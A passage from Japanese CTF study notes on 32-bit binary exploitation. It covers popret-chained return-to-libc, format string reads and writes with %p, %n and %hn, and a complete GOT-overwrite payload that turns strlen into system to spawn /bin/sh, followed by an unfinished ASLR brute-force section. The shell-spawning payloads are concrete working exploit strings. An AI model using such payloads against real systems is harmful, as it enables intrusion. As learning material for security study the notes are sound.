style="text-align:center;">関数1の引数3</td> <td style="text-align:center;">関数2の引数2を入れる</td></tr> <tr><td style="text-align:center;"></td> <td style="text-align:center;"></td> <td style="text-align:center;"></td></tr></tbody></table> <p>そこで, popret gadgetの考え方を使う。
実行ファイルの中にpopを数回おこなった後にretするという処理(gadget)が多く現れる。これに倣い, 関数を呼び出すために使用した引数分popしてからretすればスタックポインタの位置をずらすことができそう。</p> <table><thead><tr><th style="text-align:center;">SP</th> <th style="text-align:center;">内容</th> <th style="text-align:center;">補足</th></tr></thead> <tbody><tr><td style="text-align:center;"></td> <td style="text-align:center;">下位のアドレス</td> <td style="text-align:center;">0x00000000</td></tr> <tr><td style="text-align:center;"></td> <td style="text-align:center;">関数1のアドレス</td> <td style="text-align:center;"></td></tr> <tr><td style="text-align:center;"></td> <td style="text-align:center;">関数1のリターンアドレス</td> <td style="text-align:center;">pop pop pop ret (pop3ret)</td></tr> <tr><td style="text-align:center;">pop↓</td> <td style="text-align:center;">関数1の引数1</td> <td style="text-align:center;"></td></tr> <tr><td style="text-align:center;">pop↓</td> <td style="text-align:center;">関数1の引数2</td> <td style="text-align:center;"></td></tr> <tr><td style="text-align:center;">pop↓</td> <td style="text-align:center;">関数1の引数3</td> <td style="text-align:center;"></td></tr> <tr><td style="text-align:center;">ret→</td> <td style="text-align:center;">関数2のアドレス</td> <td style="text-align:center;"></td></tr> <tr><td style="text-align:center;"></td> <td style="text-align:center;">関数2のリターンアドレス</td> <td style="text-align:center;"></td></tr> <tr><td style="text-align:center;"></td> <td style="text-align:center;">関数2の引数1</td> <td style="text-align:center;"></td></tr> <tr><td style="text-align:center;"></td> <td style="text-align:center;">関数2の引数2</td> <td style="text-align:center;"></td></tr> <tr><td style="text-align:center;"></td> <td style="text-align:center;">関数2の引数3</td> <td style="text-align:center;"></td></tr></tbody></table> <p>これを活用して, プログラムを以上終了させるためにexitを呼び出してみる。</p> <table><thead><tr><th style="text-align:center;">SP</th> <th style="text-align:center;">内容</th> <th style="text-align:center;">address</th> <th style="text-align:center;">補足</th></tr></thead> <tbody><tr><td style="text-align:center;"></td> <td style="text-align:center;">下位のアドレス</td> <td style="text-align:center;">0x00000000</td> <td style="text-align:center;"></td></tr> <tr><td style="text-align:center;"></td> <td style="text-align:center;">systemのアドレス</td> <td style="text-align:center;">0xf7e16200</td> <td style="text-align:center;"></td></tr> <tr><td style="text-align:center;"></td> <td style="text-align:center;">systemのリターンアドレス</td> <td style="text-align:center;">0x080485cb</td> <td style="text-align:center;">pop ret(popret)</td></tr> <tr><td style="text-align:center;">pop↓</td> <td style="text-align:center;">systemの引数1</td> <td style="text-align:center;">0x0804a060</td> <td style="text-align:center;">buffer</td></tr> <tr><td style="text-align:center;">ret→</td> <td style="text-align:center;">exitのアドレス</td> <td style="text-align:center;">0xf7e093d0</td> <td style="text-align:center;">exit</td></tr> <tr><td style="text-align:center;"></td> <td style="text-align:center;">exitのリターンアドレス</td> <td style="text-align:center;">0x08048539</td> <td style="text-align:center;">main</td></tr> <tr><td style="text-align:center;"></td> <td style="text-align:center;">exitの引数1</td> <td style="text-align:center;">0</td> <td style="text-align:center;">return 0</td></tr></tbody></table> <h2 id="rop-return-oriented-programing"><a href="#rop-return-oriented-programing" aria-hidden="true" class="header-anchor">#</a> ROP(Return Oriented Programing)</h2> <p>???</p> <h1 id="書式文字列攻撃"><a href="#書式文字列攻撃" aria-hidden="true" class="header-anchor">#</a> 書式文字列攻撃</h1> <p><code>%p</code>は対応するスタックの値をvoid*型として16進数で表示する。</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ python -c <span class="token string">&quot;print('AAAA' + '%p.'*20)&quot;</span> <span class="token operator">|</span> ./fsb 
AAAA0x80.0xf7fb15c0.0x80484e5.0xf7fdf409.0xf63d4e2e.0xf7ffdaf8.0x41414141.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.
<span class="token assign-left variable">secret</span><span class="token operator">=</span>0x12345678
e
</code></pre></div><p>これにより, AAAAが7番目の<code>%p</code>で読み込まれていることがわかるので, スタックの7番目の値を参照すれば良いことがわかる。</p> <h2 id="任意のアドレスからの読み込み"><a href="#任意のアドレスからの読み込み" aria-hidden="true" class="header-anchor">#</a> 任意のアドレスからの読み込み</h2> <p><code>%n$s</code>でn番目の値をchar*型で出力する。</p> <p>そのため, 入力としてsecretのアドレスをあたえ, 7番目の値を参照すればおk。</p> <p>~なぜか6番目で正しく実行できているので, 0-indexedなのかも?~~
7番目でした。</p> <div class="language- extra-class"><pre class="language-text"><code>$ echo -e '\x24\xa0\x04\x08%7$s' | ./fsb |  hexdump -C
00000000  24 a0 04 08 78 56 34 12  0a 73 65 63 72 65 74 3d  |$...xV4..secret=|
00000010  30 78 31 32 33 34 35 36  37 38 0a                 |0x12345678.|
0000001b
</code></pre></div><p>ここで, 00000005から\x78\x56\x34\x12が続いているため, その正当性が確認できる。</p> <h2 id="自由な書き込み"><a href="#自由な書き込み" aria-hidden="true" class="header-anchor">#</a> 自由な書き込み</h2> <p>secret = 0x0804a024</p> <p><code>%n$n</code>で自由に書き込みができる。</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token builtin class-name">echo</span> -e <span class="token string">'<span class="token entity" title="\x24">\x24</span><span class="token entity" title="\xa0">\xa0</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x08">\x08</span>%7<span class="token variable">$s</span>'</span> <span class="token operator">|</span> ./fsb 
$�xV4
<span class="token assign-left variable">secret</span><span class="token operator">=</span>0x12345678
$ <span class="token builtin class-name">echo</span> -e <span class="token string">'<span class="token entity" title="\x24">\x24</span><span class="token entity" title="\xa0">\xa0</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x08">\x08</span>%7<span class="token variable">$n</span>'</span> <span class="token operator">|</span> ./fsb 
$�
<span class="token assign-left variable">secret</span><span class="token operator">=</span>0x4
</code></pre></div><h2 id="got-overwrite"><a href="#got-overwrite" aria-hidden="true" class="header-anchor">#</a> GOT Overwrite</h2> <h3 id="what-s-got"><a href="#what-s-got" aria-hidden="true" class="header-anchor">#</a> What's GOT?</h3> <p>GOTとは, ライブラリの関数アドレスを保存しておく領域のこと。
GOT領域を書き換えることで, eipを変更したことと同じことになる。</p> <h3 id="攻撃手法の策定"><a href="#攻撃手法の策定" aria-hidden="true" class="header-anchor">#</a> 攻撃手法の策定</h3> <p>デコンパイルをすると, fgets→printf→fgets→strlen→printfという流れで関数が呼び出されていることがわかる。</p> <p>したがって, 最初のfgetsで, 次にくるprintfでstrlenをsystem関数に書き換える攻撃コードを流し込み, 2度目のfgets関数でstrにsystem関数の引数を設定してstrlen(str)でシェルを起動する。</p> <p>GOT領域は以下のコマンドで確認できる。</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ readelf -r got

Relocation section <span class="token string">'.rel.dyn'</span> at offset 0x318 contains <span class="token number">2</span> entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049ff8  00000406 R_386_GLOB_DAT    00000000   __gmon_start__
08049ffc  00000706 R_386_GLOB_DAT    00000000   stdin@GLIBC_2.0

Relocation section <span class="token string">'.rel.plt'</span> at offset 0x328 contains <span class="token number">5</span> entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804a00c  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
0804a010  00000207 R_386_JUMP_SLOT   00000000   fgets@GLIBC_2.0
0804a014  00000307 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.4
0804a018  00000507 R_386_JUMP_SLOT   00000000   strlen@GLIBC_2.0
0804a01c  00000607 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
</code></pre></div><p>これより, strlen関数が<code>0x0804a018</code>に書き込まれることがわかる。</p> <p>次に, system関数のアドレスを確認する。
gdbによって確認すると, <code>0xf7e16200</code>であることがわかる。</p> <div class="language-bash extra-class"><pre class="language-bash"><code>gdb-peda$ p system
<span class="token variable">$1</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token operator">&lt;</span>text variable, no debug info<span class="token operator">&gt;</span><span class="token punctuation">}</span> 0xf7e16200 <span class="token operator">&lt;</span>system<span class="token operator">&gt;</span>
</code></pre></div><p>以上の情報を用いて, strlen関数をsystem関数で上書きする。
アドレスが8バイトなので, <code>%hn</code>を用いて2回に分けて攻撃を行う。
<code>0x0804a018~0x0804a019</code>に<code>0x6200</code>,
<code>0x0804a01a~0x0804a01b</code>に<code>0xf7e1</code>を書き込む。</p> <p>この文字列を入れる番地を知るために, 書式文字列攻撃を行う。</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token builtin class-name">echo</span> -e <span class="token string">'AAAA,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p'</span> <span class="token operator">|</span> ./got 
AAAA,0x80,0xf7fb15c0,0x8048520,<span class="token punctuation">(</span>nil<span class="token punctuation">)</span>,0xf7fdff9b,0x804822c,0x41414141,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70
<span class="token number">44</span>
</code></pre></div><p>以上より, 7番目に引数が格納されることがわかった。</p> <h2 id="攻撃手法のまとめ"><a href="#攻撃手法のまとめ" aria-hidden="true" class="header-anchor">#</a> 攻撃手法のまとめ</h2> <p>したがって, 攻撃文字列は以下な形式になる。</p> <table><thead><tr><th style="text-align:center;">書式文字列</th> <th style="text-align:center;">補足</th> <th style="text-align:center;">出力バイト数</th> <th style="text-align:center;">積算出力バイト数</th></tr></thead> <tbody><tr><td style="text-align:center;">0x0804a018</td> <td style="text-align:center;">GOT領域のstrlen(1)</td> <td style="text-align:center;">4</td> <td style="text-align:center;">4</td></tr> <tr><td style="text-align:center;">0x0804a01a</td> <td style="text-align:center;">GOT領域のstrlen(2)</td> <td style="text-align:center;">4</td> <td style="text-align:center;">8</td></tr> <tr><td style="text-align:center;">%25080x</td> <td style="text-align:center;">25088-8=25080</td> <td style="text-align:center;">25080</td> <td style="text-align:center;">25088(=0x6200)</td></tr> <tr><td style="text-align:center;">%7$hn</td> <td style="text-align:center;">strlenの前半4バイトを埋める</td> <td style="text-align:center;">0</td> <td style="text-align:center;">25088</td></tr> <tr><td style="text-align:center;">%38369x</td> <td style="text-align:center;">63457-25088=38369</td> <td style="text-align:center;">38369</td> <td style="text-align:center;">63457(=0xf7e1)</td></tr> <tr><td style="text-align:center;">%8$hn</td> <td style="text-align:center;">strlenの後半4バイトを埋める</td> <td style="text-align:center;">0</td> <td style="text-align:center;">63457</td></tr> <tr><td style="text-align:center;">\n</td> <td style="text-align:center;">2回目にくるfgets関数のために改行を入れておく</td> <td style="text-align:center;">-</td> <td style="text-align:center;">-</td></tr> <tr><td style="text-align:center;">/bin/sh; cat</td> <td style="text-align:center;">shellを立ち上げる</td> <td style="text-align:center;">-</td> <td style="text-align:center;">-</td></tr></tbody></table> <p>したがって, 攻撃コードは以下のようになる。</p> <h4 id="echo-ver"><a href="#echo-ver" aria-hidden="true" class="header-anchor">#</a> echo ver.</h4> <div class="language-bash extra-class"><pre class="language-bash"><code>e$ <span class="token punctuation">(</span>echo -e <span class="token string">'<span class="token entity" title="\x18">\x18</span><span class="token entity" title="\xa0">\xa0</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x08">\x08</span><span class="token entity" title="\x1a">\x1a</span><span class="token entity" title="\xa0">\xa0</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x08">\x08</span>%25080x%7<span class="token variable">$hn</span>%38369x%8<span class="token variable">$hn</span><span class="token entity" title="\n">\n</span>/bin/sh'</span><span class="token punctuation">;</span> <span class="token function">cat</span><span class="token punctuation">)</span> <span class="token operator">|</span> ./got 
</code></pre></div><h4 id="python-ver"><a href="#python-ver" aria-hidden="true" class="header-anchor">#</a> python ver.</h4> <p><strong>/bin/shの後に\x00を入れることで, 文字列の分割を行なっている。</strong></p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token punctuation">(</span>python -c <span class="token string">'import sys;sys.stdout.buffer.write(b&quot;<span class="token entity" title="\x18">\x18</span><span class="token entity" title="\xa0">\xa0</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x08">\x08</span><span class="token entity" title="\x1a">\x1a</span><span class="token entity" title="\xa0">\xa0</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x08">\x08</span>%25080x%7<span class="token variable">$hn</span>%38369x%8<span class="token variable">$hn</span><span class="token entity" title="\n">\n</span>/bin/sh<span class="token entity" title="\x00">\x00</span><span class="token entity" title="\n">\n</span>&quot;)'</span><span class="token punctuation">;</span> <span class="token function">cat</span><span class="token punctuation">;</span><span class="token punctuation">)</span> <span class="token operator">|</span> ./got
</code></pre></div><h2 id="aslrの回避"><a href="#aslrの回避" aria-hidden="true" class="header-anchor">#</a> ASLRの回避</h2> <p>ブルートフォースで回避する。</p> <p>以下のコマンドでASLRを有効にする。</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ <span class="token function">sudo</span> sysctl -w kernel.randomize_va_space<span class="token operator">=</span><span class="token number">2</span>
</code></pre></div><p><code>ldd</code>コマンドを使用することで, 共有ライブラリのメモリアドレスを確認する。
すると, randomizeされていることが確認できる。</p> <div class="language-bash extra-class"><pre class="language-bash"><code>task4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5
$ <span class="token function">sudo</span> sysctl -w kernel.randomize_va_space<span class="token operator">=</span><span class="token number">2</span>
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> task4233: 
kernel.randomize_va_space <span class="token operator">=</span> <span class="token number">2</span>
task4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5
$ ldd bof4
  linux-gate.so.1 <span class="token punctuation">(</span>0xf7f0e000<span class="token punctuation">)</span>
  libc.so.6 <span class="token operator">=</span><span class="token operator">&gt;</span> /lib/i386-linux-gnu/libc.so.6 <span class="token punctuation">(</span>0xf7d10000<span class="token punctuation">)</span>
  /lib/ld-linux.so.2 <span class="token punctuation">(</span>0xf7f10000<span class="token punctuation">)</span>
task4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5
$ ldd bof4
  linux-gate.so.1 <span class="token punctuation">(</span>0xf7f24000<span class="token punctuation">)</span>
  libc.so.6 <span class="token operator">=</span><span class="token operator">&gt;</span> /lib/i386-linux-gnu/libc.so.6 <span class="token punctuation">(</span>0xf7d26000<span class="token punctuation">)</span>
  /lib/ld-linux.so.2 <span class="token punctuation">(</span>0xf7f26000<span class="token punctuation">)</span>
task4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5
$ ldd bof4
  linux-gate.so.1 <span class="token punctuation">(</span>0xf7f74000<span class="token punctuation">)</span>
  libc.so.6 <span class="token operator">=</span><span class="token operator">&gt;</span> /lib/i386-linux-gnu/libc.so.6 <span class="token punctuation">(</span>0xf7d76000<span class="token punctuation">)</span>
  /lib/ld-linux.so.2 <span class="token punctuation">(</span>0xf7f76000<span class="token punctuation">)</span>
task4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5
$ ldd bof4
  linux-gate.so.1 <span class="token punctuation">(</span>0xf7efa000<span class="token punctuation">)</span>
  libc.so.6 <span class="token operator">=</span><span class="token operator">&gt;</span> /lib/i386-linux-gnu/libc.so.6 <span class="token punctuation">(</span>0xf7cfc000<span class="token punctuation">)</span>
  /lib/ld-linux.so.2 <span class="token punctuation">(</span>0xf7efc000<span class="token punctuation">)</span>
task4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5
$ ldd bof4
  linux-gate.so.1 <span class="token punctuation">(</span>0xf7f2e000<span class="token punctuation">)</span>
  libc.so.6 <span class="token operator">=</span><span class="token operator">&gt;</span> /lib/i386-linux-gnu/libc.so.6 <span class="token punctuation">(</span>0xf7d30000<span class="token punctuation">)</span>
  /lib/ld-linux.so.2 <span class="token punctuation">(</span>0xf7f30000<span class="token punctuation">)</span>
task4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5
$ ldd bof4
  linux-gate.so.1 <span class="token punctuation">(</span>0xf7f88000<span class="token punctuation">)</span>
  libc.so.6 <span class="token operator">=</span><span class="token operator">&gt;</span> /lib/i386-linux-gnu/libc.so.6 <span class="token punctuation">(</span>0xf7d8a000<span class="token punctuation">)</span>
  /lib/ld-linux.so.2 <span class="token punctuation">(</span>0xf7f8a000<span class="token punctuation">)</span>
task4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5
$ ldd bof4
  linux-gate.so.1 <span class="token punctuation">(</span>0xf7fc7000<span class="token punctuation">)</span>
  libc.so.6 <span class="token operator">=</span><span class="token operator">&gt;</span> /lib/i386-linux-gnu/libc.so.6 <span class="token punctuation">(</span>0xf7dc9000<span class="token punctuation">)</span>
  /lib/ld-linux.so.2 <span class="token punctuation">(</span>0xf7fc9000<span class="token punctuation">)</span>
task4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5
$ ldd bof4
  linux-gate.so.1 <span class="token punctuation">(</span>0xf7fbc000<span class="token punctuation">)</span>
  libc.so.6 <span class="token operator">=</span><span class="token operator">&gt;</span> /lib/i386-linux-gnu/libc.so.6 <span class="token punctuation">(</span>0xf7dbe000<span class="token punctuation">)</span>
  /lib/ld-linux.so.2 <span class="token punctuation">(</span>0xf7fbe000<span class="token punctuation">)</span>
task4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5
$ ldd bof4
  linux-gate.so.1 <span class="token punctuation">(</span>0xf7ee1000<span class="token punctuation">)</span>
  libc.so.6 <span class="token operator">=</span><span class="token operator">&gt;</span> /lib/i386-linux-gnu/libc.so.6 <span class="token punctuation">(</span>0xf7ce3000<span class="token punctuation">)</span>
  /lib/ld-linux.so.2 <span class="token punctuation">(</span>0xf7ee3000<span class="token punctuation">)</span>
task4233@task4233-VirtualBox:~/work/ctf/hedgehog/2/5
$ ldd bof4
  linux-gate.so.1 <span class="token punctuation">(</span>0xf7f1b000<span class="token punctuation">)</span>
  libc.so.6 <span class="token operator">=</span><span class="token operator">&gt;</span> /lib/i386-linux-gnu/libc.so.6 <span class="token punctuation">(</span>0xf7d1d000<span class="token punctuation">)</span>
  /lib/ld-linux.so.2 <span class="token punctuation">(</span>0xf7f1d000<span class="token punctuation">)</span>
</code></pre></div><p>ここで, libc.so.6に存在するsystem関数の相対番地を確認しておく。</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ nm -D /lib/i386-linux-gnu/libc.so.6 <span class="token operator">|</span> <span class="token function">grep</span> system
0003d200 T __libc_system
00129640 T svcerr_systemerr
0003d200 W system
</code></pre></div><p>すると,　<code>0x0003d200</code>に格納されていることがわかる。</p> <div class="language-bash extra-class"><pre class="language-bash"><code>$ strings -tx /lib/i386-linux-gnu/libc.so.6 <span class="token operator">|</span> <span class="token function">grep</span> /bin/sh
 17e0cf /bin/sh
</code></pre></div><p>同様にして, /bin/shも調べると<code>0x0017e0cf</code>に格納されていることがわかる。</p> <p>これらを元に, libc.so.6の番地を<code>0xf7ce1000</code>と仮定して,
system関数を<code>0xf7d1e200</code>,
bin/shを<code>0xf7e8b0cf</code>と仮定する。</p> <p>pattern_createとpattoを用いて, OFが起きている部分を確認すると, offsetは<strong>51</strong>だった。</p> <p>これらの情報を元に, 攻撃コードを組み立てる。</p> <p>工事中...</p> <h1 id="references"><a href="#references" aria-hidden="true" class="header-anchor">#</a> References</h1> <ul><li>磯井利宜・他 (2015)『セキュリティコンテストチャレンジブック-CTFで学ぼう!情報を守るための戦い方』マイナビ出版</li> <li><a href="https://gist.github.com/matsubara0507/72dc50c89200a09f7c61" target="_blank" rel="noopener noreferrer">たのしいPwn入門<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></li></ul></div> <footer class="page-edit"><!----> <div class="last-updated"><span class="prefix">Last Updated: </span> <span class="time">2019-9-5 09:12:22</span></div></footer> <!----> </main></div><div class="global-ui"></div></div>
    <script src="/note/assets/js/app.5b9b2271.js" defer></script><script src="/note/assets/js/2.a525c827.js" defer></script><script src="/note/assets/js/39.939de333.js" defer></script>
  </body>
</html>
